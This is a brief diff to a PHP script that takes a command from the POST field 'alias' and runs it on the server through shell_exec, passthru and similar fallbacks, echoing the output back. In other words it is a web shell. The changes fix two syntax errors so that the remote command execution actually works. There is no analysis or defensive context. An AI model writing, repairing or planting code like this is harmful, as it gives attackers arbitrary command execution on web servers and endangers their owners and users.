@@ -21,7 +21,7 @@ function cmd_exec($cmd2)
 		$result = join("\n",$result);
 	}
 	elseif(function_exists('shell_exec')){
-		result = shell_exec($cmd);
+		$result = shell_exec($cmd);
 	}
 	elseif(function_exists('passthru')){
 		ob_start();
@@ -39,6 +39,6 @@ function cmd_exec($cmd2)
 	echo $result;
 }
 
-$v = $_POST['alias']))
+$v = $_POST['alias'];
 cmd_exec($v);
 ?>
